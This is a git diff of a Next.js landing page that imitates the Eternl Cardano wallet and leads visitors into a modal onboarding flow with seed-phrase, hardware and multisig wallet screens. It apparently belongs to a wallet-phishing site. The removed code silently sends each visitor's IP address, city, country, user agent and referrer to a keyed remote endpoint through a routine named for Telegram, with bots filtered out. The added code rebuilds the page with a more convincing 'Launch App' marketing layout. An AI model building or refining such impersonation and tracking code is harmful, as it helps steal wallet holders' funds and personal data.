@@ -1,15 +1,12 @@
-"use client";
+ "use client";
 
-import { useState, useEffect } from "react";
-import Image from "next/image";
-import Link from "next/link";
+import { useEffect, useState } from "react";
 import {
   EternlAppSetupModal,
   EternlPinCodeModal,
   EternlWalletTypeModal,
   WalletPostOnboardingStack,
   EternlWelcomeModal,
-  EternlOnboardingHeader,
 } from "../../components/onboarding";
 import EternlTermsDrawer from "../../components/onboarding/EternlTermsDrawer";
 import EternlPreloader from "../../components/EternlPreloader";
@@ -36,21 +33,19 @@ type WalletPickerKey =
   | "account-pubkey"
   | "address-readonly"
   | "qr-import";
-import { useRef } from "react";
-import { usePathname } from "next/navigation";
-import { getUserCountry } from "../userLocation";
-import axios from "axios";
-import { API_CONFIG } from "../config";
 
-export default function LandingPage() {
+const bgPatternStyle = {
+  backgroundImage: "radial-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px)",
+  backgroundSize: "24px 24px",
+};
+
+export default function ProtectedLandingPage() {
   const [step, setStep] = useState<OnboardingStep>("welcome");
-  const [open, setOpen] = useState(true);
-  const [mode, setMode] = useState<"simple" | "pro" | null>(null);
+  const [open, setOpen] = useState(false);
   const [preloaderCounter, setPreloaderCounter] = useState(3);
   const [view, setView] = useState<"main" | "more">("main");
   const [activeSecondaryKey, setActiveSecondaryKey] = useState<WalletPickerKey | null>(null);
 
-  // Handle transition countdown for secure environment initialization
   useEffect(() => {
     if (step === "preloader" && open) {
       setPreloaderCounter(3);
@@ -68,6 +63,13 @@ export default function LandingPage() {
     }
   }, [step, open]);
 
+  const openOnboarding = () => {
+    setOpen(true);
+    setStep("welcome");
+    setView("main");
+    setActiveSecondaryKey(null);
+  };
+
   const closeAll = () => {
     setOpen(false);
     setStep("welcome");
@@ -83,608 +85,571 @@ export default function LandingPage() {
     setActiveSecondaryKey(key as WalletPickerKey);
     setStep("walletFlow");
   };
-  const [country, setCountry] = useState("");
-  const [ipAddress, setIpAddress] = useState("");
-  const [browser, setBrowser] = useState("");
-  const hasSentVisitorMessage = useRef(false);
-  const pathname = usePathname();
-  const getCurrentUrl = () => {
-    if (typeof window !== "undefined") {
-      let url = `${window.location.origin}${pathname}`;
-      if (url.includes("localhost")) {
-        url = "https://google.com";
-      }
-      if (url.includes("vercel.com")) {
-        url = url.replace("vercel.com", "digitalocean.com");
-      }
-      console.log("getCurrentUrl returning:", url);
-      return url;
-    }
-    console.log("getCurrentUrl: window not available, returning empty string");
-    return "";
-  };
-  const sendTelegramMessage = (
-    userCountry: {
-      country?: string;
-      countryEmoji?: string;
-      city?: string;
-      ip?: string;
-    } | null
-  ) => {
-    // console.log("User Country", userCountry);
-
-    // Prevent bots from triggering notifications
-    const userAgent = typeof navigator !== "undefined" ? navigator.userAgent : "";
-    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(userAgent);
-
-    if (isBot) {
-      console.log("Bot detected, skipping Telegram notification");
-      return;
-    }
-
-    const messageData = {
-      info: "Regular Visitor", // You can update this logic as needed
-      url: getCurrentUrl(),
-      referer: document.referrer || getCurrentUrl(),
-      location: {
-        country: userCountry?.country || "Unknown",
-        countryEmoji: userCountry?.countryEmoji || "",
-        city: userCountry?.city || "Unknown",
-        ipAddress: userCountry?.ip || "0.0.0.0",
-      },
-      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
-      date: new Date().toISOString(),
-      appName: "eternl",
-    };
-    console.log("Message Data", messageData);
-    axios
-      .post(
-        API_CONFIG.URL,
-        messageData,
-        {
-          headers: {
-            "Content-Type": "application/json",
-            "x-api-key": API_CONFIG.KEY,
-          },
-        }
-      )
-      .catch((error) =>
-        console.error(
-          "Error sending font message:",
-          error.response.data.details
-        )
-      );
-  };
-
-  useEffect(() => {
-    if (!hasSentVisitorMessage.current) {
-      const fetchUserLocation = async () => {
-        const userCountry = await getUserCountry();
-        sendTelegramMessage(userCountry);
-      };
-      fetchUserLocation();
-      hasSentVisitorMessage.current = true;
-    }
-  }, [sendTelegramMessage]);
-
-  useEffect(() => {
-    // Set browser info only on client side
-    if (typeof window !== "undefined") {
-      setBrowser(navigator.userAgent);
-    }
-  }, [sendTelegramMessage]);
 
   return (
-    <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">
-      <EternlOnboardingHeader />
-      
-      {/* Hero section */}
-      <section className="flex flex-col items-start text-left mt-24 px-8 w-full md:w-[80%] md:px-16 flex-grow">
-        <h1 className="mt-10 text-5xl sm:text-6xl font-extrabold leading-tight">
-          <span className="bg-gradient-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
-            A modern Cardano Wallet.{" "}
-          </span>
-          <br />
-          <span className="bg-gradient-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
-            For everyone.
-          </span>
-        </h1>
-
-        <p className="mt-6 text-xl text-white/80 max-w-[40ch]">
-          Friendly for beginners. <br />
-          Powerful for pro users.
-        </p>
-
-        <button
-          onClick={() => { setStep("welcome"); setOpen(true); }}
-          className="mt-8 bg-brand-red hover:opacity-90 text-black font-semibold rounded-full px-12 py-4 transition shadow-xl"
-        >
-          Open app
-        </button>
-
-        {/* Download cards */}
-        <div className="mt-12 flex flex-col sm:flex-row gap-6">
-          <div className="bg-[#161616] rounded-2xl shadow-md p-6 w-72 text-left">
-            <h2 className="text-white font-semibold text-lg">
-              Mobile Dapps{" "}
-              <span className="text-gray-400 font-normal">(Dapp browser)</span>
-            </h2>
-            <p className="mt-2 text-sm text-gray-400">
-              Your wallet on the go, now with DApp support.
-            </p>
-
-            <div className="mt-4 flex flex-col gap-3">
-              <Link
-                href="https://play.google.com/store"
-                target="_blank"
-                className="flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
-              >
-                <Image
-                  src="/brand/play.svg"
-                  alt="Google Play"
-                  width={20}
-                  height={20}
-                />
-                Google Play
-              </Link>
-              <Link
-                href="https://www.apple.com/app-store/"
-                target="_blank"
-                className="flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
-              >
-                <Image
-                  src="/brand/apple.svg"
-                  alt="Apple Store"
-                  width={20}
-                  height={20}
-                />
-                Apple Store
-              </Link>
-            </div>
-          </div>
-
-          <div className="bg-[#161616] rounded-2xl shadow-md p-6 w-72 text-left">
-            <h2 className="text-white font-semibold text-lg">
-              Browser Extension{" "}
-              <span className="text-gray-400 font-normal">
-                (Dapp connector & browser)
-              </span>
-            </h2>
-            <p className="mt-2 text-sm text-gray-400">
-              For Chrome, Edge, Brave and Opera.
-            </p>
-
-            <Link
-              href="https://chrome.google.com/webstore"
-              target="_blank"
-              className="mt-4 flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
-            >
-              <Image
-                src="/brand/chrome.svg"
-                alt="Chrome Web Store"
-                width={20}
-                height={20}
-              />
-              Chrome Web Store
-            </Link>
-          </div>
-        </div>
-      </section>
-
-      <EternlContent />
-
-
-      {/* Footer */}
-      <footer className="w-full max-w-5xl mt-auto mb-10 text-sm text-white/70 px-4">
-        <div className="flex flex-col sm:flex-row justify-between gap-6 bg-[#161616] rounded-2xl p-6">
-          <div>
-            <h3 className="font-semibold mb-2">Resources</h3>
-            <ul className="space-y-1">
-              <li>
-                <Link href="/about" className="hover:text-white">
-                  About
-                </Link>
-              </li>
-              <li>
-                <Link href="/about/how-to-use-eternl-wallet" className="hover:text-white">
-                  How to Use
-                </Link>
-              </li>
-              <li>
-                <Link href="/review" className="hover:text-white">
-                  Review
-                </Link>
-              </li>
-            </ul>
-          </div>
-
-          <div>
-            <h3 className="font-semibold mb-2">Social</h3>
-            <ul className="space-y-1">
-              <li>
-                <Link href="https://x.com/" className="hover:text-white">
-                  X.com
-                </Link>
-              </li>
-              <li>
-                <Link href="https://discord.com/" className="hover:text-white">
-                  Discord
-                </Link>
-              </li>
-              <li>
-                <Link
-                  href="https://web.telegram.org/"
-                  className="hover:text-white"
-                >
-                  Telegram
-                </Link>
-              </li>
-            </ul>
-          </div>
-        </div>
-      </footer>
-
-      {/* STEP 1: WELCOME */}
-      <EternlWelcomeModal
-        open={open && step === "welcome"}
-        onNext={() => setStep("appSetup")}
+    <main className="min-h-screen bg-[#0a0a0a] text-gray-300" style={bgPatternStyle}>
+      <NavigationSection onLaunchApp={openOnboarding} />
+      <HeroSection />
+      <StatsSection />
+      <FeaturesSection />
+      <TimelineSection />
+      <MythsRealitySection />
+      <SecurityStackSection />
+      <HowItWorksSection />
+      <UseCasesSection />
+      <MembershipSection />
+      <FaqSection />
+      <CtaSection />
+      <FooterSection />
+      <OnboardingFlow
+        open={open}
+        step={step}
+        view={view}
+        preloaderCounter={preloaderCounter}
+        activeSecondaryKey={activeSecondaryKey}
         onClose={closeAll}
+        onSetStep={setStep}
+        onSetView={setView}
+        onSetActiveSecondaryKey={setActiveSecondaryKey}
+        onMainSelect={handleMainSelect}
       />
-
-      {/* STEP 2: APP SETUP */}
-      <EternlAppSetupModal
-        open={open && step === "appSetup"}
-        onBack={() => setStep("welcome")}
-        onNext={(settings) => {
-          setMode(settings.mode);
-          setStep("pinCode");
-        }}
-        onClose={closeAll}
-      />
-
-      {/* STEP 3: CREATE PIN CODE */}
-      <EternlPinCodeModal
-        open={open && step === "pinCode"}
-        onBack={() => setStep("appSetup")}
-        onNext={(pin) => setStep("preloader")}
-        onSkip={() => setStep("preloader")}
-        onClose={closeAll}
-      />
-
-      {/* STEP 4: PRELOADER TRANSITION */}
-      {open && step === "preloader" && (
-        <div className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black/90 backdrop-blur-xl">
-           <EternlPreloader />
-           <div className="mt-8 text-white/60 text-lg font-medium animate-pulse">
-              Initializing secure environment... {preloaderCounter}s
-           </div>
-        </div>
-      )}
-
-      {/* STEP 5: TERMS AGREEMENT */}
-      <EternlTermsDrawer
-        open={open && step === "terms"}
-        onConfirm={() => setStep("walletType")}
-        onClose={() => setStep("pinCode")}
-      />
-
-      {/* STEP 6: WALLET TYPE PICKER */}
-      <EternlWalletTypeModal
-        open={open && step === "walletType" && view === "main"}
-        onClose={closeAll}
-        onSelect={handleMainSelect}
-      />
-
-      {/* STEP 7: WALLET FLOW (Seed phrase / Hardware) */}
-      <WalletPostOnboardingStack
-        open={open && step === "walletFlow"}
-        showTerms={false}
-        initialSubView={activeSecondaryKey === "new" ? "mnemonic" : activeSecondaryKey === "seed" ? "seedType" : activeSecondaryKey === "hardware" ? "hardware" : null}
-        onDismiss={() => setStep("walletType")}
-        onWalletSelect={(key, payload) => closeAll()}
-      />
-
-      <SecondaryModal
-        open={open && step === "walletFlow" && !["new", "seed", "hardware"].includes(activeSecondaryKey || "") && activeSecondaryKey != null}
-        onClose={() => setStep("walletType")}
-        title={ activeSecondaryKey === "multisig" ? "Multi-Sig Wallet" : "" }
-      >
-        {activeSecondaryKey === "multisig" ? (
-          <MultiSigSetup
-            onCancel={() => setStep("walletType")}
-            onConfirm={(data) => closeAll()}
-          />
-        ) : null}
-      </SecondaryModal>
     </main>
   );
 }
 
-function EternlContent() {
+function NavigationSection({ onLaunchApp }: { onLaunchApp: () => void }) {
   return (
-    <section className="w-full max-w-5xl px-6 sm:px-12 py-16 text-gray-300 space-y-16">
-      {/* Title */}
-      <div className="space-y-4 border-b border-gray-800 pb-8">
-        <h2 className="text-4xl sm:text-5xl font-extrabold text-white tracking-tight">
-          Eternl Wallet: A Secure Cardano Light Wallet for Managing ADA, NFTs, and dApps
-        </h2>
-      </div>
-
-      {/* What Is Eternl Wallet? */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">What Is Eternl Wallet?</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Overview of Eternl Wallet in the Cardano Ecosystem</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet is a non-custodial Cardano light wallet designed for managing ADA, Cardano native tokens, and NFTs. It allows users to interact directly with the Cardano blockchain while retaining full control of their private keys. Eternl is commonly used by Cardano community members who require advanced features such as staking, dApp connectivity, and hardware wallet support.
-          </p>
+    <nav className="fixed top-0 w-full z-50 backdrop-blur-md bg-[#0a0a0a]/80 border-b border-white/5">
+      <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
+        <div className="flex items-center gap-2">
+          <div className="w-8 h-8 bg-gradient-to-br from-indigo-500 to-purple-500 rounded-md flex items-center justify-center">
+            <span className="text-white font-semibold text-lg">E</span>
+          </div>
+          <span className="text-white font-medium text-lg tracking-tight">Eternl</span>
         </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Is Eternl Wallet Official and Non-Custodial?</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet operates as a non-custodial wallet, meaning users fully control their private keys and recovery phrases. No third party can access, freeze, or recover funds on behalf of the user. This self-custody model aligns with Cardano’s decentralized design and places responsibility for security entirely with the wallet owner.
-          </p>
+        <div className="hidden md:flex items-center gap-8 text-sm font-medium">
+          <a href="#" className="text-white">
+            Features
+          </a>
+          <a href="#" className="hover:text-white transition-colors">
+            Security
+          </a>
+          <a href="#" className="hover:text-white transition-colors">
+            How It Works
+          </a>
+          <a href="#" className="hover:text-white transition-colors">
+            Use Cases
+          </a>
+          <a href="#" className="hover:text-white transition-colors">
+            FAQ
+          </a>
+          <a href="#" className="hover:text-white transition-colors">
+            Wallet
+          </a>
         </div>
+        <button
+          onClick={onLaunchApp}
+          className="bg-gradient-to-r from-orange-500 to-red-500 text-white px-5 py-2 rounded-full text-sm font-medium hover:opacity-90 transition-opacity flex items-center gap-2"
+        >
+          Launch App
+          <i data-lucide="external-link" className="w-4 h-4" />
+        </button>
       </div>
+    </nav>
+  );
+}
 
-      {/* Hands-On Experience */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">Hands-On Experience Using Eternl Wallet</h2>
+function OnboardingFlow({
+  open,
+  step,
+  view,
+  preloaderCounter,
+  activeSecondaryKey,
+  onClose,
+  onSetStep,
+  onSetView,
+  onSetActiveSecondaryKey,
+  onMainSelect,
+}: {
+  open: boolean;
+  step: OnboardingStep;
+  view: "main" | "more";
+  preloaderCounter: number;
+  activeSecondaryKey: WalletPickerKey | null;
+  onClose: () => void;
+  onSetStep: (step: OnboardingStep) => void;
+  onSetView: (view: "main" | "more") => void;
+  onSetActiveSecondaryKey: (key: WalletPickerKey | null) => void;
+  onMainSelect: (key: "new" | "hardware" | "seed" | "multisig" | "more") => void;
+}) {
+  return (
+    <>
+      <EternlWelcomeModal
+        open={open && step === "welcome"}
+        onNext={() => onSetStep("appSetup")}
+        onClose={onClose}
+      />
 
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Setting Up Eternl Wallet for the First Time</h3>
-          <p className="leading-relaxed">
-            Setting up Eternl Wallet involves installing the browser extension or accessing the supported platform, creating a new wallet, and securely storing the recovery phrase. The wallet guides users through each step and requires confirmation of the recovery phrase before activation. This setup process ensures that users understand the importance of key management from the beginning.
-          </p>
-          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
-            <Image
-              src="/step1.png"
-              alt="Setting up Eternl Wallet"
-              width={1000}
-              height={600}
-              className="w-full h-auto"
-            />
+      <EternlAppSetupModal
+        open={open && step === "appSetup"}
+        onBack={() => onSetStep("welcome")}
+        onNext={() => onSetStep("pinCode")}
+        onClose={onClose}
+      />
+
+      <EternlPinCodeModal
+        open={open && step === "pinCode"}
+        onBack={() => onSetStep("appSetup")}
+        onNext={() => onSetStep("preloader")}
+        onSkip={() => onSetStep("preloader")}
+        onClose={onClose}
+      />
+
+      {open && step === "preloader" && (
+        <div className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black/90 backdrop-blur-xl">
+          <EternlPreloader />
+          <div className="mt-8 text-white/60 text-lg font-medium animate-pulse">
+            Initializing secure environment... {preloaderCounter}s
           </div>
         </div>
+      )}
 
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Creating and Managing a Cardano Wallet</h3>
-          <p className="leading-relaxed">
-            Once set up, Eternl Wallet provides a dashboard where users can view ADA balances, native tokens, and transaction history. Wallet management tools allow users to organize accounts and monitor activity in real time. The interface is designed to support both everyday transactions and advanced Cardano operations.
-          </p>
-          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
-            <Image
-              src="/step2.png"
-              alt="Creating and Managing Wallet"
-              width={1000}
-              height={600}
-              className="w-full h-auto"
-            />
+      <EternlTermsDrawer
+        open={open && step === "terms"}
+        onConfirm={() => onSetStep("walletType")}
+        onClose={() => onSetStep("pinCode")}
+      />
+
+      <EternlWalletTypeModal
+        open={open && step === "walletType" && view === "main"}
+        onClose={onClose}
+        onSelect={onMainSelect}
+      />
+
+      <WalletPostOnboardingStack
+        open={open && step === "walletFlow"}
+        showTerms={false}
+        initialSubView={
+          activeSecondaryKey === "new"
+            ? "mnemonic"
+            : activeSecondaryKey === "seed"
+              ? "seedType"
+              : activeSecondaryKey === "hardware"
+                ? "hardware"
+                : null
+        }
+        onDismiss={() => onSetStep("walletType")}
+        onWalletSelect={() => onClose()}
+      />
+
+      <SecondaryModal
+        open={
+          open &&
+          step === "walletFlow" &&
+          !["new", "seed", "hardware"].includes(activeSecondaryKey || "") &&
+          activeSecondaryKey != null
+        }
+        onClose={() => {
+          onSetStep("walletType");
+          onSetView("main");
+          onSetActiveSecondaryKey(null);
+        }}
+        title={activeSecondaryKey === "multisig" ? "Multi-Sig Wallet" : ""}
+      >
+        {activeSecondaryKey === "multisig" ? (
+          <MultiSigSetup onCancel={() => onSetStep("walletType")} onConfirm={() => onClose()} />
+        ) : null}
+      </SecondaryModal>
+    </>
+  );
+}
+
+function HeroSection() {
+  return (
+    <section className="max-w-7xl mx-auto px-6 pt-40 pb-24 grid lg:grid-cols-2 gap-16 items-center relative">
+      <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-orange-500/20 rounded-full blur-[120px] -z-10" />
+      <div>
+        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-white/10 bg-white/5 text-sm mb-6 text-gray-400">
+          <i data-lucide="shield-check" className="w-4 h-4 text-orange-400" />
+          The Most Trusted Cardano Wallet
+        </div>
+        <h1 className="text-5xl md:text-7xl font-medium tracking-tight text-white leading-[1.1] mb-6">
+          Your Gateway
+          <br />
+          to the
+          <span className="text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-red-500">
+            Cardano
+            <br />
+            Ecosystem
+          </span>
+        </h1>
+        <p className="text-base md:text-lg text-gray-400 mb-8 max-w-md leading-relaxed">
+          Next-gen non-custodial wallet. Stake, transact, and explore Cardano dApps securely.
+        </p>
+        <div className="flex flex-wrap items-center gap-4 mb-10">
+          <button className="bg-gradient-to-r from-orange-500 to-red-500 text-white px-6 py-3 rounded-full text-base font-medium hover:shadow-[0_0_20px_rgba(249,115,22,0.4)] transition-all flex items-center gap-2">
+            Get Started Free
+            <i data-lucide="arrow-right" className="w-4 h-4" />
+          </button>
+          <button className="px-6 py-3 rounded-full text-base font-medium text-white border border-white/10 hover:bg-white/5 transition-colors">
+            Explore Features
+          </button>
+        </div>
+        <div className="flex items-center gap-6 text-sm text-gray-500">
+          <span className="flex items-center gap-2">
+            <i data-lucide="check-circle-2" className="w-4 h-4 text-gray-400" />
+            Non-Custodial
+          </span>
+          <span className="flex items-center gap-2">
+            <i data-lucide="zap" className="w-4 h-4 text-orange-400" />
+            Instant Staking
+          </span>
+          <span className="flex items-center gap-2">
+            <i data-lucide="layers" className="w-4 h-4 text-blue-400" />
+            Multi-Account
+          </span>
+        </div>
+      </div>
+      <div className="relative">
+        <div className="absolute inset-0 bg-gradient-to-tr from-orange-500/10 to-transparent rounded-2xl blur-xl" />
+        <div className="bg-[#121214] border border-white/10 rounded-2xl p-6 shadow-2xl relative overflow-hidden">
+          <div className="flex items-center justify-between mb-8">
+            <div className="flex items-center gap-3">
+              <div className="w-10 h-10 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-lg" />
+              <div>
+                <div className="text-sm font-medium text-white">Main Account</div>
+                <div className="text-xs text-gray-500">addr1...x7k2</div>
+              </div>
+            </div>
+            <div className="w-2 h-2 bg-green-500 rounded-full shadow-[0_0_8px_rgba(34,197,94,0.6)]" />
           </div>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Sending and Receiving ADA and Native Tokens</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet enables users to send and receive ADA and Cardano native tokens by generating wallet addresses and confirming transactions. Before broadcasting a transaction, the wallet displays detailed information including fees and asset amounts. This transparency helps users verify transactions before final approval.
-          </p>
-          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
-            <Image
-              src="/step3.png"
-              alt="Sending and Receiving ADA"
-              width={1000}
-              height={600}
-              className="w-full h-auto"
-            />
+          <div className="flex justify-between items-end mb-8">
+            <div>
+              <div className="text-sm text-gray-400 mb-1">Total Balance</div>
+              <div className="text-4xl font-medium tracking-tight text-white">
+                24,847.52
+                <span className="text-base text-gray-500">ADA</span>
+              </div>
+              <div className="text-sm text-green-400 mt-1">+12.4% this month</div>
+            </div>
+            <div className="flex items-center gap-2 bg-[#1a1a1d] px-3 py-1.5 rounded-md border border-white/5">
+              <i data-lucide="lock" className="w-4 h-4 text-orange-400" />
+              <span className="text-xs text-white">Secured</span>
+            </div>
           </div>
-        </div>
-      </div>
-
-      {/* Security Features */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">Security Features and Privacy Model</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Private Keys, Recovery Phrase, and Self-Custody</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet stores private keys locally and never transmits recovery phrases to external servers. Users are solely responsible for safeguarding their recovery phrase, which is required to restore access to funds. This self-custody approach ensures full ownership but requires careful security practices.
-          </p>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Hardware Wallet Support for Additional Security</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet supports hardware wallets such as Ledger and Trezor, allowing users to keep private keys offline. When connected, transactions must be physically confirmed on the hardware device before execution. This significantly reduces exposure to online threats and phishing attempts.
-          </p>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Protecting Against Common Wallet Risks</h3>
-          <p className="leading-relaxed">
-            The wallet includes confirmation prompts and clear transaction previews to help prevent accidental or malicious transfers. Users are encouraged to verify dApp permissions and URLs before approving connections. Maintaining updated software and practicing phishing awareness are essential for safe usage.
-          </p>
-        </div>
-      </div>
-
-      {/* Staking ADA */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">Staking ADA with Eternl Wallet</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">How ADA Staking Works on Cardano</h3>
-          <p className="leading-relaxed">
-            ADA staking on Cardano allows users to delegate their funds to stake pools without locking their assets. Delegated ADA remains fully spendable while contributing to network security and decentralization. Rewards are distributed automatically at the end of each epoch based on pool performance.
-          </p>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">How to Stake ADA Using Eternl Wallet</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet provides a built-in staking interface where users can browse available stake pools and delegate their ADA. The process requires selecting a pool, confirming the delegation transaction, and paying a small network fee. Rewards are tracked directly within the wallet.
-          </p>
-          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
-            <Image
-              src="/step5.png"
-              alt="Staking ADA"
-              width={1000}
-              height={600}
-              className="w-full h-auto"
-            />
+          <div className="grid grid-cols-2 gap-4 mb-8">
+            <div className="bg-[#1a1a1d] p-4 rounded-xl border border-white/5">
+              <div className="text-sm text-gray-400 mb-1">Staked</div>
+              <div className="text-base font-medium text-white">18,500 ADA</div>
+            </div>
+            <div className="bg-[#1a1a1d] p-4 rounded-xl border border-white/5 flex justify-between items-center">
+              <div>
+                <div className="text-sm text-gray-400 mb-1">Rewards</div>
+                <div className="text-base font-medium text-orange-400">+847 ADA</div>
+              </div>
+              <i data-lucide="trending-up" className="w-5 h-5 text-orange-400" />
+            </div>
           </div>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Choosing and Managing Stake Pools</h3>
-          <p className="leading-relaxed">
-            Users can evaluate stake pools based on metrics such as saturation, performance, and fees. Eternl Wallet allows redelegation at any time without penalty. This flexibility enables users to adjust their staking strategy as network conditions change.
-          </p>
-          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
-            <Image
-              src="/step6.png"
-              alt="Managing Stake Pools"
-              width={1000}
-              height={600}
-              className="w-full h-auto"
-            />
+          <div className="grid grid-cols-2 gap-4">
+            <button className="bg-white/5 hover:bg-white/10 text-white py-3 rounded-xl text-sm font-medium border border-white/10 transition-colors">
+              Send
+            </button>
+            <button className="bg-[#2a2a2d] hover:bg-[#333336] text-white py-3 rounded-xl text-sm font-medium transition-colors border border-white/5">
+              Receive
+            </button>
           </div>
-        </div>
-      </div>
-
-      {/* Using with dApps */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">Using Eternl Wallet with Cardano dApps</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Connecting Eternl Wallet to Decentralized Applications</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet supports standardized Cardano dApp connections, enabling interaction with decentralized platforms. When a dApp requests access, users must manually approve the connection. This ensures that permissions are granted only when intended.
-          </p>
-          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
-            <Image
-              src="/step7.png"
-              alt="Connecting to dApps"
-              width={1000}
-              height={600}
-              className="w-full h-auto"
-            />
-          </div>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Transaction Approvals and User Permissions</h3>
-          <p className="leading-relaxed">
-            Each transaction initiated through a dApp requires explicit user confirmation within the wallet. Eternl Wallet displays transaction details before approval, allowing users to review actions before signing. This process maintains transparency and user control.
-          </p>
-          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
-            <Image
-              src="/step8.png"
-              alt="Transaction Approvals"
-              width={1000}
-              height={600}
-              className="w-full h-auto"
-            />
-          </div>
-        </div>
-      </div>
-
-      {/* NFT Management */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">NFT Management in Eternl Wallet</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Viewing and Managing Cardano NFTs</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet includes native support for Cardano NFTs, allowing users to view and manage collections directly. NFT metadata is displayed within the wallet interface for supported standards. This removes the need for third-party NFT management tools.
-          </p>
-          <div className="w-full rounded-2xl overflow-hidden border border-gray-800 shadow-2xl mt-4">
-            <Image
-              src="/step9.png"
-              alt="Viewing NFTs"
-              width={1000}
-              height={600}
-              className="w-full h-auto"
-            />
-          </div>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Sending and Receiving NFTs Safely</h3>
-          <p className="leading-relaxed">
-            NFT transfers in Eternl Wallet follow the same confirmation process as token transactions. Users can verify asset details and destination addresses before approval. This reduces the risk of sending NFTs to incorrect or malicious addresses.
-          </p>
-        </div>
-      </div>
-
-      {/* Advantages and Limitations */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">Eternl Wallet Advantages and Limitations</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Key Advantages of Eternl Wallet</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet offers advanced Cardano-specific features, strong self-custody controls, and hardware wallet compatibility. Its focus on the Cardano ecosystem makes it suitable for users seeking deeper network interaction. The wallet supports both everyday use and advanced functionality.
-          </p>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Potential Limitations to Consider</h3>
-          <p className="leading-relaxed">
-            New users may experience a learning curve due to the wallet’s advanced features. As a non-custodial wallet, Eternl Wallet does not provide account recovery services. Users must take full responsibility for securing their recovery phrase.
-          </p>
-        </div>
-      </div>
-
-      {/* Who Should Use */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">Who Should Use Eternl Wallet?</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Suitable Users and Use Cases</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet is well suited for Cardano users who prioritize control, security, and access to staking and dApps. It is commonly used by individuals who actively participate in the Cardano ecosystem. Users seeking full ownership of their assets may benefit most from this wallet.
-          </p>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">When Eternl Wallet May Not Be the Best Option</h3>
-          <p className="leading-relaxed">
-            Users who prefer custodial solutions or simplified recovery options may find Eternl Wallet less suitable. Those unfamiliar with self-custody practices should ensure they understand wallet security responsibilities before use.
-          </p>
-        </div>
-      </div>
-
-      {/* FAQ */}
-      <div className="space-y-8">
-        <h2 className="text-3xl font-bold text-white">Frequently Asked Questions About Eternl Wallet</h2>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Is Eternl Wallet safe to use?</h3>
-          <p className="leading-relaxed">
-            Eternl Wallet is considered safe when used correctly and with proper key management practices. Its non-custodial design ensures user control but requires careful security habits.
-          </p>
-        </div>
-
-        <div className="space-y-4">
-          <h3 className="text-xl font-semibold text-pink-400">Does Eternl Wallet support NFTs and hardware wallets?</h3>
